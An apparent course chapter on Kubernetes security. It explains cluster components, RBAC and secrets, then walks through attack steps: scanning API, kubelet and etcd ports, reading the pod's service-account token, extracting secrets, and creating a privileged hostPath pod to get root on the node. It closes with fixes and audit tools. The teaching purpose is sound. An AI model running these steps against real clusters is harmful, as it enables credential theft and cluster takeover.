# Supplementary: Kubernetes Security

Kubernetes (K8s) orchestrates containerized applications at scale. If Docker runs one container, Kubernetes manages hundreds or thousands of containers across multiple machines. As infrastructure moves to K8s, understanding its security model is critical for both attacking and defending modern environments.

---

## What Kubernetes Actually Is

### The problem it solves

Without Kubernetes:
```
You have 50 Docker containers across 10 servers.
Questions:
  - Which server should each container run on?
  - What happens when a container crashes? (nothing — it stays dead)
  - How do containers on different servers talk to each other?
  - How do you update all containers without downtime?
  - How do you scale from 3 copies to 30 when traffic spikes?
  - How do you manage secrets, configs, and storage for each container?
```

Kubernetes answers all of these automatically.

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    CONTROL PLANE                         │
│  ┌──────────┐  ┌──────────┐  ┌───────────┐  ┌────────┐ │
│  │ API      │  │ etcd     │  │ Scheduler │  │ Cont.  │ │
│  │ Server   │  │ (database)│  │           │  │ Manager│ │
│  └──────────┘  └──────────┘  └───────────┘  └────────┘ │
└────────────────────────┬────────────────────────────────┘
                         │
            ┌────────────┼────────────┐
            ↓            ↓            ↓
     ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
     │   NODE 1    │ │   NODE 2    │ │   NODE 3    │
     │  ┌───────┐  │ │  ┌───────┐  │ │  ┌───────┐  │
     │  │ Pod A │  │ │  │ Pod C │  │ │  │ Pod E │  │
     │  │ Pod B │  │ │  │ Pod D │  │ │  │ Pod F │  │
     │  └───────┘  │ │  └───────┘  │ │  └───────┘  │
     │  kubelet    │ │  kubelet    │ │  kubelet    │
     │  kube-proxy │ │  kube-proxy │ │  kube-proxy │
     └─────────────┘ └─────────────┘ └─────────────┘
```

### Components explained

**Control Plane (the brain):**

| Component | What it does | Security relevance |
|---|---|---|
| **API Server** | Front door to everything — all commands go through here | If compromised, the attacker controls the entire cluster |
| **etcd** | Database storing ALL cluster state (configs, secrets, pod definitions) | Contains secrets in plaintext by default — encrypt at rest! |
| **Scheduler** | Decides which node runs each pod | If manipulated, pods can be scheduled on specific nodes |
| **Controller Manager** | Ensures desired state matches actual state (restarts crashed pods, etc.) | Manages the reconciliation loop |

**Worker Nodes (the muscle):**

| Component | What it does | Security relevance |
|---|---|---|
| **kubelet** | Agent that runs pods on the node | Kubelet API can be exploited if exposed (port 10250) |
| **kube-proxy** | Handles networking between pods and services | Manages iptables rules for service routing |
| **Container Runtime** | Actually runs containers (containerd, CRI-O) | Container escape → node compromise |

**Pods:**
The smallest unit in Kubernetes. A pod is one or more containers that share network and storage. Think of it as a wrapper around your Docker container.

```
Pod = container + networking + storage + config

A web app might have:
  Pod 1: nginx container
  Pod 2: python API container
  Pod 3: redis cache container
```

---

## Kubernetes Concepts for Security

### Namespaces

Logical partitions within a cluster. Think of them like folders:

```
default          — where pods go if you don't specify
kube-system      — Kubernetes internal components (API server, DNS, etc.)
kube-public      — publicly readable data
production       — custom namespace for prod workloads
development      — custom namespace for dev workloads
```

**Security relevance:** A compromise in `development` namespace shouldn't reach `production` — but poor RBAC often allows it.

### Service accounts

Every pod runs as a **service account**. By default, it's the `default` service account in that namespace. The service account's token is mounted into the pod at:

```
/var/run/secrets/kubernetes.io/serviceaccount/token
```

**Security relevance:** If you compromise a pod, you can read this token and use it to talk to the Kubernetes API. The permissions depend on the RBAC configuration.

### RBAC (Role-Based Access Control)

Controls who can do what in the cluster:

```yaml
# A Role defines permissions
kind: Role
metadata:
  namespace: default
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]      # can only view pods

# A RoleBinding ties a Role to a user/service account
kind: RoleBinding
metadata:
  namespace: default
subjects:
- kind: ServiceAccount
  name: my-app
roleRef:
  kind: Role
  name: pod-reader
```

**ClusterRole** = permissions across ALL namespaces.
**ClusterRoleBinding** = binding that applies cluster-wide.

**The dangerous one:**

```yaml
kind: ClusterRoleBinding
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin        # FULL CONTROL of the entire cluster
```

If the default service account has `cluster-admin`, every pod in the default namespace can control the entire cluster. This is a critical misconfiguration.

### Secrets

Kubernetes "secrets" are base64 encoded, NOT encrypted by default:

```bash
# Create a secret
kubectl create secret generic db-creds --from-literal=password=SuperSecret123

# View the secret
kubectl get secret db-creds -o yaml
# data:
#   password: U3VwZXJTZWNyZXQxMjM=

echo "U3VwZXJTZWNyZXQxMjM=" | base64 -d
# SuperSecret123
```

**Anyone who can read secrets has the plaintext.** This is a common finding in pentests.

---

## Attacking Kubernetes

### From outside the cluster

```bash
# Scan for Kubernetes components
nmap -sV -p 6443,8443,10250,10255,2379 TARGET

# Port meanings:
# 6443/8443  — Kubernetes API server (HTTPS)
# 10250      — Kubelet API (authenticated)
# 10255      — Kubelet API (read-only, sometimes unauthenticated)
# 2379       — etcd (the database — JACKPOT if exposed)

# Check for unauthenticated API access
curl -k https://TARGET:6443/api
curl -k https://TARGET:6443/api/v1/namespaces
curl -k https://TARGET:6443/api/v1/pods

# Check kubelet
curl -k https://TARGET:10250/pods
curl http://TARGET:10255/pods     # read-only kubelet (no auth)

# Check etcd (if port 2379 is exposed)
etcdctl --endpoints=http://TARGET:2379 get / --prefix
# This dumps EVERYTHING — secrets, configs, the entire cluster state
```

### From inside a pod (you compromised a container)

**Step 1: Check if you're in Kubernetes**

```bash
# Environment variables reveal Kubernetes info
env | grep KUBERNETES
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443

# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

If those files exist, you're in a Kubernetes pod.

**Step 2: Talk to the API server**

```bash
# Set up variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Test what you can do
curl -sk $API_SERVER/api -H "Authorization: Bearer $TOKEN"

# List pods in your namespace
curl -sk $API_SERVER/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN"

# List secrets (if you have permission)
curl -sk $API_SERVER/api/v1/namespaces/default/secrets -H "Authorization: Bearer $TOKEN"

# Try to list everything (cluster-wide)
curl -sk $API_SERVER/api/v1/pods -H "Authorization: Bearer $TOKEN"
curl -sk $API_SERVER/api/v1/secrets -H "Authorization: Bearer $TOKEN"
curl -sk $API_SERVER/api/v1/namespaces -H "Authorization: Bearer $TOKEN"
```

**Step 3: If you can read secrets — extract them**

```bash
# Get a specific secret
curl -sk $API_SERVER/api/v1/namespaces/default/secrets/db-creds -H "Authorization: Bearer $TOKEN"

# The response includes base64-encoded values
# Decode them
echo "BASE64_VALUE" | base64 -d
```

**Step 4: If you can create pods — escalate to node access**

```bash
# If you have permission to create pods, you can mount the host filesystem
cat << 'EOF' > escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape
  namespace: default
spec:
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/bash", "-c", "sleep infinity"]
    volumeMounts:
    - mountPath: /host
      name: hostfs
    securityContext:
      privileged: true
  volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
  hostNetwork: true
  hostPID: true
EOF

# Apply it
curl -sk $API_SERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST --data-binary @escape-pod.yaml

# Exec into the pod
# The host filesystem is mounted at /host
# chroot /host bash → you're root on the NODE
```

### Using kubectl (if you can install it)

```bash
# If you can download kubectl into the pod
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

# Use the pod's service account
./kubectl auth can-i --list
# Shows everything you're allowed to do

./kubectl get pods
./kubectl get secrets
./kubectl get nodes
./kubectl get namespaces

# Get all secrets in all namespaces (if cluster-admin)
./kubectl get secrets --all-namespaces -o yaml
```

---

## Common Kubernetes Misconfigurations

### 1. Overly permissive RBAC

```
Problem: Default service account has cluster-admin
Impact: Any compromised pod can control the entire cluster
Fix: Create minimal service accounts for each workload
Check: kubectl auth can-i --list --as=system:serviceaccount:default:default
```

### 2. Secrets not encrypted at rest

```
Problem: etcd stores secrets in plaintext
Impact: Anyone with etcd access reads all secrets
Fix: Enable encryption at rest in API server config
Check: kubectl get secrets -o yaml → values are base64, not encrypted
```

### 3. Privileged containers

```
Problem: Pod spec includes securityContext.privileged: true
Impact: Container has almost full host access → easy escape
Fix: Use PodSecurityPolicies/PodSecurityAdmissions to block privileged
Check: kubectl get pods -o json | grep privileged
```

### 4. Exposed dashboards and APIs

```
Problem: Kubernetes dashboard, kubelet API, or etcd accessible without auth
Impact: Full cluster access from the network
Fix: Use authentication, don't expose to untrusted networks
Check: nmap -p 6443,8443,10250,10255,2379,8001 TARGET
```

### 5. Pods running as root

```
Problem: Container process runs as root (UID 0)
Impact: If container escape occurs, attacker is root on the node
Fix: runAsNonRoot: true in securityContext
Check: kubectl exec POD -- id
```

### 6. No network policies

```
Problem: All pods can talk to all other pods by default
Impact: Compromising one pod gives network access to everything
Fix: Implement NetworkPolicies to restrict pod-to-pod communication
Check: kubectl get networkpolicies --all-namespaces
       (if empty → no restrictions)
```

---

## Kubernetes Security Tools

```bash
# kubeaudit — audit cluster for common misconfigurations
kubeaudit all

# kube-bench — check against CIS Kubernetes Benchmark
kube-bench run

# kube-hunter — penetration testing tool for Kubernetes
kube-hunter --remote TARGET_IP
kube-hunter --pod        # run from inside a pod

# trivy — scan container images for vulnerabilities
trivy image nginx:latest
trivy k8s --report=summary cluster

# kubescape — comprehensive K8s security scanning
kubescape scan
```

---

## Kubernetes vs Docker Security Comparison

| Aspect | Docker | Kubernetes |
|---|---|---|
| Scale | Single host | Multi-host cluster |
| Escape impact | Compromises one host | Can compromise entire cluster |
| Secrets | Environment variables (visible with inspect) | Secret objects (base64, queryable via API) |
| Networking | Bridge/overlay networks | Pod network, services, ingress |
| RBAC | None built-in | Full RBAC system |
| Main attack surface | Docker socket, privileged mode | API server, RBAC misconfig, etcd |
| Service accounts | N/A | Token mounted in every pod |
| Monitoring | docker logs | Pod logs, audit logs, admission controllers |

---

## Key Takeaways

```
OFFENSIVE:
  1. Check for exposed API server (6443), kubelet (10250), etcd (2379)
  2. Inside a pod → read service account token → query API
  3. Check RBAC: can you list secrets? create pods? access other namespaces?
  4. Secrets are base64, not encrypted — reading them = plaintext creds
  5. If you can create pods → mount hostPath → escape to node
  6. etcd exposed = game over (contains everything)

DEFENSIVE:
  1. Minimal RBAC — don't give default service account any extra permissions
  2. Encrypt secrets at rest
  3. No privileged containers
  4. Network policies between namespaces
  5. Don't expose API/etcd/kubelet to untrusted networks
  6. Run containers as non-root
  7. Use admission controllers to enforce policies
  8. Regular auditing with kube-bench and kubeaudit
```
